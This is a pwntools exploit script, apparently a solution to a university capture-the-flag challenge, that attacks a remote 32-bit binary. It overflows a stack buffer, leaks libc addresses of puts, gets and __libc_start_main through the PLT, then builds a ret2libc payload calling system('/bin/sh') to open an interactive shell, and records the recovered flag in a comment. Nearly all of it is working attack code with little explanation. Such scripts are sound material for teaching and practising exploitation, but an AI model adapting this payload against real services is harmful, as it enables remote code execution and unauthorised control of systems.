from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10014
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+31
        b *vuln+39
        b *0x08048350
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

print(p.recvline())
puts_plt = p32(e.plt["puts"])
main = p32(e.symbols["main"])
vuln = p32(e.symbols["vuln"])
popret = p32(0x0804856b)


def leak_libc_address(function):
    got_address = p32(e.got[function])

    dummy = b'A' * (8 + 12)
    payload = dummy
    payload += puts_plt + popret + got_address
    payload += main

    p.sendline(payload)
    sleep(1)

    # print(p.recv())

    response = p.recvline()
    print(f"Got response: {response}")
    leaked_bytes = response[:4]
    leaked_address = hex(u32(leaked_bytes))
    print(f"Function {function} is at: {leaked_address} (libc?)")

    p.recv()  # Doomed forever to utter the words... good luck!
    sleep(1)
    return leaked_address


# libc: libc6-i386_2.24-11+deb9u4_amd64 (got from https://libc.blukat.me/)


puts_libc = leak_libc_address('puts')
print(puts_libc, '\n')
puts_libc_baseoffset = 0x05f890

# setvbuf from server won't work, so from that libc it might be
print("setvbuf from server doesn't work")
base_address = int(puts_libc, 16) - puts_libc_baseoffset
print(f"Derived base address from puts: {hex(base_address)}")
setvbuf_libc_baseoffset = 0x060000  # manually taken from libc
possible_setvbuf_address = base_address + setvbuf_libc_baseoffset
print(f"setvbuf address might be: {hex(possible_setvbuf_address)}\n")

gets_libc = leak_libc_address('gets')
print(gets_libc, "\n")
gets_libc_baseoffset = 0x05efc0

libc_start_main_libc = leak_libc_address('__libc_start_main')
print(libc_start_main_libc, "\n")
libc_start_main_baseoffset = 0x018190

# CSCE604258{890_000_fc0_190} might be wrong order but we solved it

# shell for funsies
system_base_offset = 0x03a850
system_address = base_address + system_base_offset
system_address = p32(system_address)

str_bin_sh_offset = 0x15d7c8
str_bin_sh_address = base_address + str_bin_sh_offset
str_bin_sh_address = p32(str_bin_sh_address)
# got most of those addresses from that website

dummy = b'A' * (8 + 12)
payload = dummy
payload += system_address + popret + str_bin_sh_address
p.sendline(payload)
p.interactive()

if LOCAL and DEBUG:
    pause()
